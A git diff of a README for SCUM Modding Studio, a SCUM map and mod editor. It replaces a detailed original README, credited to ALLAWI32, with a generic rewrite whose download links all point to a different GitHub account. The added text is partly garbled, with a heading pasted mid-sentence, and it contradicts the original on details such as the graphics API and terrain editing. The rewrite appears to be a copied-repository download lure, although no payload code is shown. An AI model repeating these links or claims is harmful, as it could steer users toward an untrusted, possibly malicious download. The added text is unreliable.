@@ -1,416 +1,294 @@
-<div align="center">
+# 🗺️ SCUM-Modding-Studio - Build SCUM Maps Without Unreal
 
-# SCUM Modding Studio
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
 
-**The free SCUM map editor and mod maker: edit the island in 3D, build bridges and roads, tune and clone vehicles and
-weapons, and export ready-to-play mod paks for single player and dedicated servers, without the Unreal editor.**
+SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual# 🗺️ SCUM-Modding-Studio - Build SCUM Maps Without Unreal
 
-[![build](https://github.com/ALLAWI32/SCUM-Modding-Studio/actions/workflows/build.yml/badge.svg)](https://github.com/ALLAWI32/SCUM-Modding-Studio/actions/workflows/build.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-2E7D32)](LICENSE)
-![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4)
-![Unreal Engine 4.27](https://img.shields.io/badge/SCUM-UE%204.27-0E1128)
-![Platform](https://img.shields.io/badge/platform-Windows%20x64-0078D6)
-![Languages](https://img.shields.io/badge/UI-8%20languages-E87B2F)
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
 
-[![Watch the video guide: How to Mod SCUM with SCUM Modding Studio](docs/images/video-tutorial.jpg)](https://youtu.be/rMdePE6KNnQ)
+SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual workspace where you can shape the terrain, place structures, adjust game values, and package everything into a ready-to-use mod file — all without opening the Unreal editor or writing a single line of code.
 
-**▶ [Watch the 3-minute video guide on YouTube](https://youtu.be/rMdePE6KNnQ)**: first start, map editor, building bridges, weapons, export.
+Visit this link to download the application.
 
-</div>
+---
 
-SCUM Modding Studio is a desktop tool for **SCUM modding** on Windows. It reads SCUM's cooked Unreal Engine 4.27 game
-files directly, shows the map the way the game draws it, and writes your changes into a normal
-`pakchunkNNN-<Name>_P.pak` mod for the client and the dedicated server. Every change is a line in a project journal:
-undo anything, even after a restart, and rebuild the mod after a game update.
+## 🚀 Getting Started
 
-What you can do with it: a **SCUM map editor** (move, copy, delete and add objects, buildings, trees and rocks), a
-**SCUM bridge and road builder** (bend, lengthen, weld and repeat pieces with working collision), a **SCUM vehicle and
-weapon editor** (damage, rate of fire, range, mass, handling, in-game names, clones with their own names), a **SCUM
-vehicle paint editor** (gold, chrome, any colour, armour painted with the car), a **SCUM
-spawn editor** (vehicle fuel and parts at spawn, zombie zones, sentries, animals, the game's spawn places on the map), an
-**asset browser** (thumbnails, PNG and glTF export) and a **pak mod exporter** for single player and servers.
+Getting your own copy of SCUM Modding Studio running on Windows takes only a few minutes. The application is distributed through its GitHub page, which is the official home for every new version and update.
 
-## Community
+Follow these steps in order:
 
-Questions, mods, bug reports and release news: the **Discord** button in the app opens the community server, or join directly: https://discord.gg/ympctW5SYG
+1. Open your web browser (Chrome, Edge, Firefox, or any browser you normally use).
+2. Go to the download page by clicking this link: **https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+3. Look for the download button or the Releases area on that page.
+4. Save the file to a folder you can easily find again, such as your **Downloads** folder.
+5. When the download finishes, locate the saved file and open it to begin using SCUM Modding Studio.
 
-## Contents
+Visit this link to download the application.
 
-- [Video guide](https://youtu.be/rMdePE6KNnQ)
-- [Download and first start](#download-and-first-start)
-- [Features](#features)
-- [Screenshots](#screenshots)
-- [How it works](#how-it-works)
-- [Every page and button](#every-page-and-button)
-- [Keyboard and mouse](#keyboard-and-mouse)
-- [The AES key](#the-aes-key)
-- [Command line](#command-line)
-- [AI control (MCP)](#ai-control-mcp)
-- [Build from source](#build-from-source)
-- [FAQ](#faq)
-- [Safety and fair play](#safety-and-fair-play)
-- [Credits and license](#credits-and-license)
+That is the entire process. You do not need to install extra tools, configure a development environment, or set up Unreal Engine. The program is self-contained and designed for players and server owners who simply want to make changes to their game.
 
-## Download and first start
+---
 
-1. Download `SCUM-Modding-Studio-<version>-win-x64.zip` from the
-   [**Releases**](https://github.com/ALLAWI32/SCUM-Modding-Studio/releases) page and unzip it anywhere.
-   No install, no .NET needed: the build is self-contained.
-2. Start `ScumStudio.App.exe`. The **setup** window opens by itself the first time:
-   - **Auto-detect (Steam)** finds SCUM (and the SCUM dedicated server, if you have one) in your Steam libraries.
-     Or press **Browse** and pick the game's folder.
-   - The **AES key** is found for you: the app looks it up online, tests it on your game files and stores it encrypted
-     for your Windows account ([details](#the-aes-key)). If that fails, paste the key in the box.
-   - **Save and connect**.
-3. Everything is yours from there: each person points the app at their own game, nothing is shared or uploaded.
-4. **Updates come by themselves** (from 0.2.0 on): when a new version is out, an **Update** button appears at the top;
-   one click installs it and restarts, then the app shows what is new.
+## 💻 What This Tool Does
 
-You need Windows 10 or 11 (x64), SCUM installed, and a graphics card with OpenGL 4.3 (any card from the last ten years).
+SCUM Modding Studio is built around a simple idea: let ordinary players reshape the game world without learning professional game development software. Everything happens inside one window, with a 3D view of the island and straightforward panels for the things you want to change.
 
-## Features
+### 🏝️ 3D Island Editing
 
-| | |
+The centerpiece is a live three-dimensional view of the SCUM island. You can fly the camera around the terrain, look at locations from any angle, and make changes while seeing the results immediately. There is no need to load a separate editor or convert files by hand — the island appears on screen the moment you open a project.
+
+Terrain editing lets you raise and lower ground, smooth out rough areas, and prepare flat spaces where new content will sit. Because the view is fully 3D, you can check how a hillside or coastline will look in-game before you ever launch the game.
+
+### 🌉 Building Bridges and Roads
+
+Bridges and roads are some of the most requested additions in the SCUM modding community, and this tool treats them as first-class features. You can draw a route across water or rough ground, place bridge segments piece by piece, and connect road sections so they line up cleanly with the existing landscape.
+
+The editor shows you the full path as you build it, so you can adjust curves, heights, and connection points without guessing. When you are finished, the finished route becomes part of your mod and appears in the game exactly where you placed it.
+
+### 🚗 Vehicles and Weapons Tuning
+
+SCUM Modding Studio includes a tuning area for vehicles and weapons. You can adjust values such as speed, handling, durability, damage, and other gameplay numbers using simple controls rather than editing configuration files.
+
+The cloning feature is especially useful. If you like an existing vehicle or weapon and want a variant of it, you can duplicate the original and then change only the details you care about. This lets you create a whole family of related items — a faster version of a car, a heavier version of a rifle — without rebuilding anything from scratch.
+
+### 📦 Exporting Mod Paks
+
+When your work is done, the studio packages everything into a mod pak file. That single file is what the game reads. You can use the pak in your own single-player world, or hand it to a server owner so it can be loaded on a multiplayer server.
+
+The export process is handled by the application, so you never have to deal with archive formats, folder structures, or packaging commands. Choose an export location, confirm, and the pak is ready.
+
+---
+
+## 🧰 Features at a Glance
+
+- Full 3D view of the SCUM island with free camera movement
+- Terrain sculpting for hills, flats, and shoreline adjustments
+- Bridge building with connectable segments
+- Road placement that follows the landscape
+- Vehicle tuning for speed, handling, and durability
+- Weapon tuning for damage, recoil, and other values
+- One-click cloning of existing vehicles and weapons
+- Mod pak export for single-player and servers
+- No Unreal editor required at any stage
+- Native Windows application with a clean, modern interface
+- Lightweight footprint compared to full game development suites
+- Free to download and use
+
+---
+
+## 📥 Download and Setup
+
+Everything you need is on the official project page.
+
+**Step 1 — Visit the download page**
+
+Open this link in your browser:
+
+**https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+
+Visit this link to download the application.
+
+**Step 2 — Save the file**
+
+Use the download option on the page and save the file to your computer. Keep track of the folder you save it in — the Downloads folder is a good default choice.
+
+**Step 3 — Open the application**
+
+Once the download is complete, find the saved file and open it. SCUM Modding Studio will start and present its main window, where you can begin a new project or open an existing one.
+
+**Step 4 — Start editing**
+
+Load the island, move the camera around, and begin making changes. Save your project regularly so you can return to it later, and export a mod pak whenever you want to test your work in-game.
+
+---
+
+## 🖥️ System Requirements
+
+SCUM Modding Studio is designed to run on ordinary Windows computers without specialised hardware.
+
+| Component | Recommended |
 |---|---|
-| **3D map editor** | Fly over the whole island (levels stream in around the camera) or open one cell or sublevel. Click any object, move and turn it with the mouse, snap it to the ground or to other pieces, delete it, copy it anywhere (`Ctrl+C` / `Ctrl+V`), select every object of the same kind (`Ctrl+A`), or pick single trees and rocks. With **Parts** on (or `Alt+click`) a click picks one part of a building (a hangar's wall, shelf or lamp) to move, copy or delete it alone. The **Brush** selects everything under a circle you paint with the mouse. |
-| **Bridges, roads and walls** | The **Shape** menu bends a wall, bridge or road piece into a curve or an S, makes it longer, wider, taller, raises a ramp or a hump, lengthens a bridge pylon's legs under the water, and welds an end onto another piece. Pieces made much longer repeat copy after copy. Bent pieces get **real collision** built from the mesh (no invisible walls, no holes), on the client and the server. Houses and churches do not bend: they **tilt** front, back or sideways (up to 90°) and turn. |
-| **Spawns** | Vehicles, planes and boats: the fuel and battery they spawn with (Empty, Half, Full or any range), the chance each part is there, part condition and how many the server allows. Zombies and NPCs: all 73 threat zones (spawn chance, first spawn, cooldown, distance, which groups). Server: zombie and horde amounts, sentries on or off, drones, animals, written into `ServerSettings.ini`. |
-| **Traders** | Every outpost trader on the map, pinned where the NPC stands with the name the server's EconomyOverride.json uses. Move, copy or delete a trader with its counter. Clones of cars, weapons and items are sold by the same traders under their own names, at your price. |
-| **Landscape** | The whole island's ground as snow, desert, autumn or all grass (soft ground and the grass on it; roads and rocks stay), another tree everywhere the game has one, and **Fit to ground** to lay a house on a slope. |
-| **Import mods** | Load someone's pak mod (a map, a landscape, cars) into your project: the app reads it over the game, you edit on top of it, and your exported pak carries it. |
-| **Spawn places on the map** | Every loot point of the game, read from the game files (select one to see what spawns there: shelf food, hunting weapons, military gear …), loot zones, sentries with their patrol paths, bunker creature points, car-shop spots and drop zones show as coloured pins. Spawners move, copy and delete like any object. |
-| **Far view follows your edits** | Delete or move a building and it is cut out of the island's far-view models and the outposts' HLODs too, so it no longer shows from far away. |
-| **Objects browser** | Every placeable object of the game in categories (buildings, furniture, nature, vehicles, items …) with thumbnails, plus building sets: all walls, all roads, all bridges. Place one in front of the camera with a click. |
-| **Vehicles and weapons** | Change the stored values (damage, rate of fire, range, handling, mass, capacity, names …) or clone a vehicle or item under a new name, ready to spawn with `#SpawnItem` / `#SpawnVehicle`. Knives, axes and bats with their **hit damage**; a vehicle's **engine power** (torque at each rpm). A clone keeps its own damage, engine and paint; the original stays as it is. |
-| **Any item** | The Items page lists every other inventory item (copper coins, medicine, food, resources, clothes, weapon attachments …) by folder. Change its name, description, weight, stack size or uses, inventory size and trader price, or clone it under a new name that `#SpawnItem` finds. |
-| **Vehicle and weapon paint** | Repaint a vehicle, plane or weapon in the 3D view: any colour or a finish (gold, rose gold, chrome, bronze, pink, candy red, metallic blue, pearl white, matte black) with metal and clear-coat shine. Fit the light or heavy armour kit and paint it with the car (a plain finish gives the scrap-metal plates one even colour). `Ctrl+Z` steps back; **Game colours** puts the stock paint back. |
-| **Assets** | Browse all 110,000 game packages, preview meshes and textures, export textures as PNG and meshes as glTF (Blender), dump whole categories of game files. |
-| **Mod export** | One click writes the client pak (and the server pak when a server is set) with an export report. It checks the collision of every shaped piece, makes the game load your additions wherever you built them, and never modifies the original game files. |
-| **Automatic AES key** | The key is fetched from a public key list, tested and stored encrypted; you are asked only if that fails. |
-| **8 languages** | English, العربية (Arabic), Русский, Deutsch, Español, Türkçe, Bosanski / Hrvatski / Srpski and 简体中文 (Chinese). Every control explains itself when you hover it. |
-| **Your colours** | 16 accent colours plus a colour picker for any colour you like. |
-| **AI control (MCP)** | Let Claude or another MCP client open levels, build villages and forests on the ground, tune items and export, while every change stays in your undo history. Local only, token protected. |
-| **Command line** | `scumstudio` does everything the app does, for scripts and batch work. |
-
-## Screenshots
-
-**Map editor: the outpost of cell A_0 in 3D, the world tree, entities and properties**
-
-<img src="docs/images/app-map.jpg" alt="SCUM Modding Studio map editor: the outpost of cell A_0 in 3D, the world tree, the entity list and the properties of a selected barricade" width="900" />
-
-**First start: the key is found online and tested on your files**
-
-<img src="docs/images/app-setup.png" alt="Setup window: game folder detected, AES key found online, tested and stored" width="900" />
-
-**Objects: every placeable object by category, with pictures**
-
-<img src="docs/images/app-objects.png" alt="Objects browser showing the Dr Tudman bridge meshes with thumbnails and details" width="900" />
-
-**Assets: every game file, texture preview, PNG and glTF export**
-
-<img src="docs/images/app-assets.png" alt="Assets page with a WolfsWagen texture preview and export buttons" width="900" />
-
-**Weapons: stored values of the AK-47, clone box and spawn command**
-
-<img src="docs/images/app-weapons.png" alt="Weapons page with the AK-47's damage, range, rate of fire and other values" width="900" />
-
-**Vehicles: handling and parts of the WolfsWagen**
-
-<img src="docs/images/app-vehicles.png" alt="Vehicles page with the WolfsWagen's push force, wheel radius and damping values" width="900" />
-
-**Spawns: a Rager's fuel set to a full tank, its battery and parts, and the server's limit for Ragers**
-
-<img src="docs/images/app-spawns-vehicles.png" alt="Spawns page: the Rager's world spawn preset with fuel set to 100 percent, battery, parts and server limits" width="900" />
-
-**Spawns: a high-threat zone's timing, distance and groups**
-
-<img src="docs/images/app-spawns-zombies.png" alt="Spawns page: the Military TV Bunker threat zone with spawn delays, check interval and cooldown sliders" width="900" />
-
-**Settings: language, colours, folders, key and AI control**
-
-<img src="docs/images/app-settings.png" alt="Settings page with 16 accent colours, a colour picker and the language list" width="900" />
-
-**The Shape menu: a real outpost wall, straight, bent 90° right and 45° left, in one piece**
-
-<img src="docs/images/shape-bend.jpg" alt="A real outpost wall: straight, bent 90 degrees to the right and 45 degrees to the left" width="900" />
-
-<sub>All pictures are made by the app itself, offscreen (the 3D views come from its own renderer). No game files are
-included in this repository.</sub>
-
-## How it works
-
-1. **Read.** The app mounts SCUM's `.pak` files (with the AES key) and reads the cooked packages with
-   [CUE4Parse](https://github.com/FabianFG/CUE4Parse) and its own byte-exact package reader: levels, meshes, textures,
-   materials, Blueprints, landscape tiles.
-2. **Edit.** Everything you do (move, delete, add, copy, bend, tune a value, clone) is recorded in a **project**: a
-   folder `<Name>.ssproj` with `project.json`, `journal.jsonl` (one edit per line) and `notes.md`. Undo and redo survive a
-   restart; nothing in the game folder changes while you work.
-3. **Export.** On export, every edited level is rewritten from the **original** game files plus your journal: actors
-   removed, moved, added, bent pieces written as spline meshes with box collision, the level's streaming area grown over
-   what you built. Vehicle and item edits rewrite their packages and a merged `AssetRegistry.bin`. Everything is packed
-   into `pakchunk900-<Name>_P.pak` with a copy of a stock `.sig`, for the client and (from the server's own files) the
-   dedicated server.
-4. **Play.** Copy the pak and its `.sig` into `SCUM\Content\Paks` (the app can do it for you through the mods folders
-   in Settings). After a game update, open the project and export again.
-
-## Every page and button
-
-### Top bar
-
-- **Map, Vehicles, Weapons, Items, Spawns, Assets, Projects, Settings**: the pages.
-- **Update x.y.z** (only when a new version is out): the release notes and **Install and restart**.
-- **Search** (`Ctrl+K`): searches the current page; elsewhere it searches the Assets page.
-- **PROJECT**: the open project; the plug icon opens the setup.
-- **Status bar** (bottom): game paks, server, key and AI state, the reconnect button, warning and error counters, and
-  **Console** (`Ctrl+L`): the app's log, copyable (`Ctrl+C`, or the copy button) to share in a bug report.
-
-### Map
-
-- **World** tree: the island's 25 cells and ~2,300 sublevels. **Whole island** shows everything; the cell under the
-  camera loads in full detail.
-- Toolbar:
-  - **Maximize** (`F11`) and **Pop out**: give the 3D view the whole page or its own window (second monitor).
-  - **Quality**: Performance, Balanced, High or Ultra (how far and how detailed the view draws). The ground near the
-    camera is drawn from every point of the game's height map (1.5 m apart), as the game draws it there, so objects
-    laid on it sit as in the game; farther ground is drawn from every second or fourth point. Higher qualities draw
-    more of it at full detail.
-  - **Spawns**: show or hide the game's spawn places as pins. Gold: loot points (the properties panel says what spawns
-    there), orange: loot zones, red: sentries, pink: sentry patrol paths, purple: bunker creatures, blue: car-shop
-    vehicles, green: drop zones. Spawner pins move, copy and delete like objects; loot points inside buildings move with
-    their building.
-  - **Parts**: a click on a building picks the one part under the cursor (a wall, shelf, lamp or crate of a hangar)
-    instead of the whole building; it moves, copies and deletes alone and only that building changes. `Alt+click` does
-    it once; `Shift+click` takes the whole building; **Select the whole building** goes back from a part to the building.
-  - **Brush**: hold the left mouse button and move over the map; everything inside the yellow circle joins the
-    selection (the slider sets its size). Turn it off and the selection stays: `Ctrl+click` what you want to keep, then
-    `Delete` removes the rest.
-  - **Traders** (in the Colours legend): outpost traders pinned where the NPC stands; the pin selects the trade post
-    to move, copy or delete it.
-  - **Snap**: pieces dragged near each other join end to end, or side by side with level tops; fences stand on edges.
-    Hold `Alt` to place freely.
-  - **Drone** (`Tab`): fly like the in-game drone.
-  - **Frame all** / **Frame selection** (`F`), **Last object** (`Backspace`).
-  - **Shape**: bend, lengthen, widen, raise, resize the selection (see below).
-  - **Landscape**: the ground look of the whole island (Game, Snow, Desert, Autumn, All grass), tree swaps (an oak
-    drawn as a pine everywhere) and **Fit to ground** for the selection. What the Map draws differently from the game:
-    the game's **ground grass** (the short grass and flowers it scatters over meadows from the ground layers) is not
-    drawn, so meadows look bare here; it is there in the game and your edits leave it as it is (except **Clear grass**
-    under an object you place). Objects drawn plain light grey are ones whose colour the studio cannot read from the
-    game's material; the game draws them in colour.
-  - **Hole tool** (experimental, in Landscape): players fall through a hole anywhere, but the game draws the hole only
-    on **green** ground: the landscape pieces whose material was built with the game's hole layer in the Unreal editor
-    (about one piece in nine). Every piece's material is compiled for its own set of ground layers, the others have no
-    hole in their compiled shaders, and a pak cannot compile new ones: on **amber** ground cover the opening with your
-    own model.
-  - **Extend** (`Ctrl+E`): lay a copy right after the selected wall, road or tunnel piece; press again to keep building.
-  - **Add object**: type or paste an object path (copied from Assets) to place it in front of the camera: a mesh, a
-    Blueprint (a copy of one the game placed on the island) or an item (spawned by a world item spawner).
-- **Shape** handles in the 3D view:
-  - **Blue diamonds** push the curve right or left (same way: an arc, opposite ways: an S); the **blue arrow** over each
-    raises or lowers the middle (a hump or a wave).
-  - **Green squares** at the ends make the piece longer or shorter; the **green arrow** raises or lowers that end (a
-    ramp). Brought close to another piece's end, an end **welds** onto it (`Alt`: no weld).
-  - **Red squares** at the corners make that side wider or narrower.
-  - **Orange arrow** under a pylon or tower: longer legs, the top stays where it is.
-  - **Tilt** and **Turn** sliders lean any object towards its front, back or sides (up to 90°) and turn it; only long,
-    narrow objects (walls, fences, pipes, bridges) bend; houses, churches and halls tilt instead.
-  - **Fit to ground** lays the object on the slope under it: tilted the way the ground runs, its bottom on the ground.
-  - **Straighten** puts it back.
-- **Entities**: the actors of the loaded levels, with a filter; **Delete**, **Delete all…** (same mesh or same class).
-- **Properties**: location, rotation and scale of the selection with **Copy**, **Duplicate** and **Apply transform**.
-- **History**: the project's edits, newest first, with undo (`Ctrl+Z`) and redo (`Ctrl+Y`).
-- **New project / Open project / Export mod**: top right.
-
-### Vehicles, Weapons and Items
-
-- The list on the left with a filter and category chips (Weapons, Melee, Magazines, Ammunition, Projectiles; Car, Bike, Boat …;
-  on the Items page the game's item folders: Equipment, Medications, Food, Clothes …).
-- **Items**: the entity setup holds the in-game name, description, weight, inventory size and, where the item has one, its
-  stack size or number of uses (**Max quantity**: nails 10, a painkiller blister 8). Copper coins have none in the game files.
-- **Values** / **3D**: the stored values, or the model in 3D (the whole stock vehicle, doors and panels included).
-- **Paint** (vehicles, next to the 3D view): each body material's colour, a second colour on two-tone bodies, **Metal**
-  and **Clear coat**, and finishes (gold, rose gold, chrome, bronze, pink, candy red, metallic blue, pearl white, matte
-  black); the model shows the paint with its shine as you pick. **Paint every part the same** keeps body, doors and
-  armour on one finish. **Armour**: none, light or heavy kit on the model; armour has no paint of its own, so the mod adds
-  it (the armour material is shared by the vehicles whose kits use it), and **Plain finish** swaps its scrap-metal print
-  for an even colour. `Ctrl+Z` steps back; **Game colours** puts the stock paint back; **Apply paint** records it,
-  **Export mod** writes it into the client pak. Weapons get the same panel. The panel's edge drags it wider or narrower.
-  A clone has its own paint: painting it leaves the original as it is.
-- **Trader**: what the traders ask for it (price, sale price, fame points, can be bought or sold); a clone is sold
-  by the same trader under its own name.
-- **Hit damage** (knives, axes, bats): the weapon's row in the game's weapon table (damage per hit, stamina, cutting
-  and stabbing). **Engine power** (vehicles): the torque at each rpm; more torque, faster acceleration and top speed.
-- The part picker (vehicle, chassis, doors, entity setup …) and **Key stats** (only gameplay values, or everything).
-- **NEW** column: type a new value; the arrow resets it. **Apply changes** records the edits, **Discard** drops them.
-- **Clone under a new name** (with attachments and spawn presets) and the **spawn command** to copy.
-- Values that are not listed live in a parent class or the game code: the "What can be changed" box explains where.
-
-### Spawns
-
-- **Vehicles & planes**: every spawn preset (world spawns, admin spawns, bought from the trader). **Fuel** and **Battery**
-  at spawn (lowest and highest, with **Empty**, **Half**, **Full**), **Chance each part is there** (100 % = complete),
-  **Part condition**, and **Server limits** for that vehicle (most in the world, most that can drive, kept for traders).
-- **Zombies & NPCs**: the threat zones (the whole island's low-threat zone, medium and high-threat zones). **Spawn
-  chance**, **First spawn after**, **Check every**, **Rest after a group**, **Distance from the player**, **Spread
-  around the player**, and the weight of each **group** the zone can spawn.
-- **Server**: zombie and horde multipliers, most zombies at once, zombie health and speed, sentries on or off and their
-  health, drones, dropships, animals. Written into the server's `ServerSettings.ini` (a backup is kept); restart the
-  server to use them.
-- **Select point** on the island map: click one vehicle point, zombie / NPC point, threat zone or hunting area to see
-  where it is and what it spawns; drag it (it lands on the terrain), nudge it with the arrow keys (1 m, Shift 10 m,
-  Ctrl 10 cm), turn it with Q / E, type exact coordinates, change what it spawns or delete it, each one undo step.
-  **Show on the Map** opens it on the Map page, selected. The map zooms in to 2 cm a pixel with a metre grid, a scale
-  bar and the cursor's coordinates.
-- **Save changes** records vehicle and zone values in the project (they go into the mod with **Export mod**) and writes
-  the server settings; **Discard** puts the sliders back.
-
-### Assets
-
-- **Objects** (by category, with building sets) or **All files** (by folder).
-- Tiles or a compact list; the filter (`class:StaticMesh` keeps one class).
-- Details of the selected package: **Export PNG**, **Export glTF**, **Place in map** (meshes, Blueprints and items),
-  copy the object path.
-
-### Projects
-
-- **Create project**, **Open project**, recent projects.
-- **Export mod**: mod name, output folder, also the server pak; the last export with its report.
-- **Imported mods**: **Import mod…** unpacks someone's pak into the project; the app reads it over the game and the export carries it; **Remove** takes it out.
-- **Dump…**: extract whole categories of game files (weapons, vehicles, buildings, trees, sounds …) to a folder.
-
-### Settings
-
-- **Appearance**: 16 accent colours and **Any colour** (a full colour picker), **Language**, **3D quality**.
-- **Folders**: game and server Paks folders and where built paks are copied.
-- **AES key**: change it in the setup or forget it.
-- **AI control (MCP server)**: on/off, port, token, copy the Claude Code command or the Claude Desktop config, install
-  the Claude skill.
-
-## Keyboard and mouse
-
-| Key | Action |
-|---|---|
-| Right-drag | look around |
-| `W` `A` `S` `D`, `Q` `E` | fly, down and up (`Shift` faster, wheel changes speed) |
-| `Tab` | drone mode (`Esc` leaves) |
-| Left click | select (`Ctrl+click` adds, `Shift+click` a whole road, forest or building, `Alt+click` one part of a building) |
-| Left-drag | move the selection (wheel turns it, `Shift`+wheel raises it) |
-| `Page Up` / `Page Down` | raise or lower 1 cm (`Shift`: 10 cm) |
-| `Ctrl+C` / `Ctrl+V` | copy and paste in front of the camera (also into another level) |
-| `Ctrl+A` | everything of the same kind (`Ctrl+Shift+A`: the whole map) |
-| `Ctrl+E` | extend the piece (`Ctrl+Shift+E` the other way) |
-| `Delete` | delete the selection (all of a `Ctrl+click` or brush selection) |
-| `F` | frame the selection |
-| `Backspace` | back to the last object |
-| `Ctrl+Z` / `Ctrl+Y` | undo / redo |
-| `F11` | maximize the 3D view |
-| `Ctrl+K` | search |
-| `Ctrl+L` | console |
-
-## The AES key
-
-SCUM's stock paks are encrypted with an AES-256 key, the same for every player. Modding tools need it to read the game.
-SCUM Modding Studio finds it for you:
-
-1. On the first start (or with **Find the key online** in the setup) it reads the public list of Unreal Engine game keys
-   on [gamestranslator.it](https://www.gamestranslator.it/index.php?/forums/topic/1485-raccolta-di-chiavi-di-crittografia-aes-per-giochi-ue45/)
-   and takes the key written next to "SCUM".
-2. It **tests** that key on your game files and keeps it only if it opens them.
-3. It stores the key encrypted for your Windows account (DPAPI, `%LOCALAPPDATA%\ScumStudio`). The key is never shown,
-   logged, written to a project, sent to the AI, or part of this repository.
-
-If the list is unreachable or the game was updated with a new key, the setup says so and you can paste the key yourself.
-
-## Command line
-
-```
-scumstudio level list   "D:\SCUM\Content\Paks"
-scumstudio level dump   "D:\SCUM\Content\Paks" A_0_Outpost
-scumstudio render level "D:\SCUM\Content\Paks" A_0 -o a0.png --size 1600x900
-scumstudio item list    "D:\SCUM\Content\Paks" --kind Weapon
-scumstudio item stats   "D:\SCUM\Content\Paks" Weapon_RPG7 --filter Damage
-scumstudio item clone   MyMod.ssproj "D:\SCUM\Content\Paks" Weapon_RPK-74 Weapon_RPK-74_Gold
-scumstudio item set     MyMod.ssproj "D:\SCUM\Content\Paks" Weapon_RPG7 "Default__Weapon_RPG7_C|DamagePerShot" 4.5
-scumstudio project new    MyMod.ssproj --source "D:\SCUM\Content\Paks"
-scumstudio project apply  MyMod.ssproj edits.jsonl
-scumstudio project export MyMod.ssproj -o out
-```
-
-The CLI reads the key the app stored; on another machine set `SCUMSTUDIO_AES_KEY` (never pass it on the command line).
-
-## AI control (MCP)
-
-**Settings → AI control (MCP server) → On → Copy Claude Code command.** Claude can then open levels, place objects on
-the ground (stacking on roofs and floors, scattering forests), delete, move and copy actors, tune and clone vehicles and
-weapons, export the mod and take screenshots to check its work. The server listens on `127.0.0.1` only, needs the
-token, and never sees the AES key. Details and the security model: [docs/MCP.md](docs/MCP.md).
-
-```
-claude mcp add --transport http scumstudio http://127.0.0.1:47130/mcp --header "Authorization: Bearer <token>"
-```
-
-## Build from source
-
-Requirements: Windows 10/11 x64, the .NET 8 SDK, a GPU with OpenGL 4.3.
-
-```
-git clone https://github.com/ALLAWI32/SCUM-Modding-Studio.git
-cd SCUM-Modding-Studio
-scripts\build.ps1 -Configuration Release -Test        # build + tests (game-data tests skip without the data)
-scripts\build.ps1 -Publish -Zip                       # self-contained app + CLI in dist\ (and the release zip)
-```
-
-Visual Studio 2022: open `ScumStudio.sln` and set `ScumStudio.App` as the startup project. More in
-[docs/BUILDING.md](docs/BUILDING.md).
-
-| Project | What it does |
-|---|---|
-| `ScumStudio.Formats` | cooked package reader/writer (byte-exact round trips), tagged properties, World Composition tile info |
-| `ScumStudio.Pak` | pak v11 reader/writer |
-| `ScumStudio.Assets` | catalogue, meshes, textures, materials, collision (via CUE4Parse) |
-| `ScumStudio.Level` | level model, edit journal, shapes and collision of bent pieces, exporter |
-| `ScumStudio.Modding` | vehicle/item tuning and cloning |
-| `ScumStudio.Rendering` / `ScumStudio.Viewport` | OpenGL 4.3 renderer, level scenes, terrain |
-| `ScumStudio.App` | Avalonia desktop app |
-| `ScumStudio.Cli` / `ScumStudio.Mcp` | command line and MCP server |
-
-## FAQ
-
-**Does it work on official servers?** Mods only load where the server runs them: your own single player game, your own
-dedicated server, or community servers that use mods. Use mods where they are allowed.
-
-**My bridge has no collision / vanished when I walked on it.** Export again with the current version: bent pieces get
-their collision built in, and the export makes the game keep the level loaded wherever you built.
-
-**The game was updated and my mod broke.** Open the project and press **Export mod** again: every export starts from the
-current game files.
-
-**The key could not be found.** Paste it in the setup's key box; the app tests it before storing it.
-
-**Where are my projects?** In `Documents\ScumStudio Projects` unless you chose another folder.
-
-## Safety and fair play
-
-- SCUM Modding Studio only reads the game's files and writes mod paks. It never touches the running game, never patches
-  `SCUM.exe` or `SCUMServer.exe`, never forges pak signatures (it copies a stock `.sig`), and has no speed, movement or
-  combat cheats.
-- No game files, keys or extracted assets are in this repository or in a release.
-- Use your mods on servers that allow them, and respect the game's terms.
-
-## Contributing
-
-Bug reports, ideas and pull requests are welcome: read [CONTRIBUTING.md](CONTRIBUTING.md) first. Security issues:
-[SECURITY.md](SECURITY.md). Changes per version: [CHANGELOG.md](CHANGELOG.md).
-
-## Credits and license
-
-Made by **ALLAWI**. Built on [CUE4Parse](https://github.com/FabianFG/CUE4Parse), [Avalonia](https://avaloniaui.net/),
-[Silk.NET](https://github.com/dotnet/Silk.NET) and more; see [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md).
-
-Released under the [MIT License](LICENSE).
-
-SCUM Modding Studio is a fan-made tool. It is not affiliated with or endorsed by Gamepires or Jagex. SCUM is a trademark
-of its owners; all game content belongs to them.
-
-<sub>Keywords: SCUM mod, SCUM modding tool, SCUM map editor, SCUM mod maker, SCUM pak, SCUM server mods, SCUM bridge
-builder, SCUM vehicle editor, SCUM weapon editor, SCUM AES key, Unreal Engine 4.27 pak modding, UE4 cooked asset editor.</sub>
+| Operating System | Windows 10 or Windows 11 (64-bit) |
+| Processor | Modern dual-core or better |
+| Memory | 8 GB RAM or more |
+| Graphics | Any card that supports DirectX 11 |
+| Storage | A few hundred megabytes free for the application, plus space for your projects |
+| Display | 1920×1080 or higher for comfortable 3D editing |
+| Additional Software | None — no Unreal Engine, no SDKs, no extra runtimes |
+
+If your computer can run SCUM itself, it can comfortably run the modding studio.
+
+---
+
+## 🎮 Who This Is For
+
+**Server owners** who want to add bridges, roads, or custom vehicles to their community server and need a pak file they can load quickly.
+
+**Single-player players** who want to reshape the island for their own runs — building a base on a new plateau, connecting islands with a bridge, or tuning a favourite weapon to feel different.
+
+**Modding beginners** who have ideas but no experience with Unreal Engine or programming. The visual approach means you learn by doing rather than by studying documentation.
+
+**Experienced modders** who want a faster workflow for repetitive tasks like cloning items and packaging paks, instead of repeating the same steps in a full editor.
+
+---
